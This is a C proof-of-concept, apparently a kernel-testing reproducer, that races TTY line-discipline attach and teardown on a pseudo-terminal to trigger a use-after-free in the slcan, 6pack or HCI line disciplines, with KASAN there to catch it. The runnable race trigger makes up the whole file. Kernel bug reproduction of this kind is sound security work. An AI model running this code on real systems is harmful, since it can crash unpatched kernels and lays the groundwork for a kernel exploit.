#define LDISC 17
/*
 * CHAINFORGE KASAN crash-trigger — generic TTY LINE-DISCIPLINE teardown race (CWE-362 -> CWE-416).
 * Covers the slcan / 6pack / hci_ldisc family: attaching a line discipline (TIOCSETD) allocates
 * per-ldisc state bound to tty->disc_data; closing/detaching races the ldisc's write_wakeup/
 * teardown -> UAF on disc_data or the ldisc's netdev. Drive it from a pty (master/slave) with no
 * hardware. Compile with -DLDISC=<n> (N_SLCAN=17, N_6PACK=7, N_HCI=15). NOT an exploit.
 */
#define _GNU_SOURCE
#include <fcntl.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <termios.h>
#include <unistd.h>

#ifndef LDISC
#define LDISC 17 /* N_SLCAN */
#endif
#ifndef N_TTY
#define N_TTY 0
#endif

#include <stdlib.h>

/* Open a pty pair via /dev/ptmx (no openpty -> no -lutil dependency). */
static int open_pty(int *master, int *slave) {
    int m = open("/dev/ptmx", O_RDWR | O_NOCTTY);
    if (m < 0) return -1;
    unlockpt(m);
    grantpt(m);
    char *sn = ptsname(m);
    if (!sn) { close(m); return -1; }
    int s = open(sn, O_RDWR | O_NOCTTY);
    if (s < 0) { close(m); return -1; }
    *master = m;
    *slave = s;
    return 0;
}

static volatile int stop = 0;

/* SHARED tty for the current round: all racing threads act on the SAME fd (the whole point —
 * the race is between concurrent ops on one tty, not isolated ptys). Republished each round. */
static volatile int g_master = -1;
static volatile int g_slave = -1;
static volatile int round_gen = 0;

/* setter: hammer TIOCSETD on the shared slave — attach the target ldisc then N_TTY. The attach
 * allocates disc_data (+ netdev for slcan/6pack); the switch/close frees it. */
static void *setter(void *arg) {
    (void)arg;
    int on = LDISC, off = N_TTY;
    while (!stop) {
        int s = g_slave;
        if (s >= 0) {
            ioctl(s, TIOCSETD, &on);
            ioctl(s, TIOCSETD, &off);
        }
    }
    return NULL;
}

/* writer: write to the shared master so the ldisc's receive/write_wakeup path runs while the
 * setter is tearing the ldisc down -> use-after-free on disc_data. */
static void *writer(void *arg) {
    (void)arg;
    char b[64];
    memset(b, 'A', sizeof b);
    while (!stop) {
        int m = g_master;
        if (m >= 0) write(m, b, sizeof b);
    }
    return NULL;
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    printf("[cf] ldisc race (shared tty), N=%d\n", LDISC);
    pthread_t st1, st2, wr1, wr2;
    pthread_create(&st1, NULL, setter, NULL);
    pthread_create(&st2, NULL, setter, NULL);
    pthread_create(&wr1, NULL, writer, NULL);
    pthread_create(&wr2, NULL, writer, NULL);

    const int rounds = 4000;
    for (int i = 0; i < rounds && !stop; i++) {
        int m = -1, s = -1;
        if (open_pty(&m, &s) != 0) continue;
        g_master = m;
        g_slave = s;               /* publish the shared tty to the racing threads */
        usleep(300);               /* let setters/writers pile onto it */
        g_slave = -1;
        g_master = -1;
        close(s);                  /* tear down the tty + ldisc UNDER the racing threads */
        close(m);
        if ((i & 0x1ff) == 0) printf("[cf] ldisc racing round %d/%d\n", i, rounds);
    }
    stop = 1;
    pthread_join(st1, NULL);
    pthread_join(st2, NULL);
    pthread_join(wr1, NULL);
    pthread_join(wr2, NULL);
    printf("[cf] done (no KASAN splat this run)\n");
    return 0;
}
